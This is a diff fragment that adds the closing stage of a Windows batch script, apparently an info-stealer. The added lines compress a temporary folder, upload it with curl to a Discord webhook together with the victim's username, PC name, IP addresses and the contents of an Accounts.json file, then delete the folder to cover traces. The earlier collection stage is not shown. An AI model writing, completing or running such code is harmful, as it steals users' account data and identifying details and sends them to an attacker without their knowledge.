@@ -1,0 +1,12 @@
+rem Create the .zip file using PowerShell
+powershell -noprofile -command "Compress-Archive -Path '%tempDir%\*' -DestinationPath '%tempDir%\data.zip'"
+
+rem Send the .zip file to Discord webhook
+curl -k -F file=@"%tempDir%\data.zip" -F content="```Username:%username%``` ```PC Name:%pcname%``` ```IPv4 Address:%ipv4%``` ```IPv6 Address:%ipv6%``` ```Accounts.json Contents: %accounts_json%```" %webhook%
+
+rem Clean up the temporary directory
+rd /s /q "%tempDir%"
+
+echo Data sent successfully.
+timeout 2 >NUL
+exit /b
